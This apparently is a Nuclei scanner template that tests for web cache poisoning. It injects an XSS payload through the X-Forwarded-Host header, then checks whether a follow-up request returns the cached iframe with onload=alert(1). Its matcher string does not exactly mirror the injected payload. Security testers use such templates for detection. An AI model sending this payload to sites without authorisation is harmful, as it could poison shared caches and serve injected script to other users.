id: cache-poisoning-selective

info:
  name: Cache Poisoning Selective
  author: kauenavarro
  severity: medium

requests:
  - raw:
      - |
        GET /?kauecache=9 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (<snip> Firefox/60.0)
        X-Forwarded-Host: a"><iframe onload=alert(1)>

      - |
        GET /?kauecache=9 HTTP/1.1
      - |
        GET /?kauecache=9 HTTP/1.1
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, ">a<iframe onload=alert(1)>") == true'
